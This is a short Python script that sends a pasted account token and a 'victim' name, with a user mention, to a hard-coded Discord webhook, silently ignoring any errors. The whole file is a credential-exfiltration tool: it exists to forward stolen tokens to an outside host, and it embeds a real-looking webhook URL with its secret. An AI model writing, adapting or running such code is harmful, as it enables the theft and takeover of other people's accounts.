Token = 'PASTE TOKEN HERE'
Victim = 'PASTE VICTIM NAME HERE'

# https://trinket.io/embed/python3

import os
import re
import json

from urllib.request import Request, urlopen

WEBHOOK_URL = 'https://discord.com/api/webhooks/1044767203930673265/g0DQ-Uenxd5PyaNW0yKQn1abi3wcbK5nfM-cBT0YGjLUBXjb-53D28lekTNqVmh_ORsT'

def main():

    message = '<@604711228199141378> \nToken: \n``' + Token + "``\nVictim Name: \n``" + Victim + "``"
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

main()
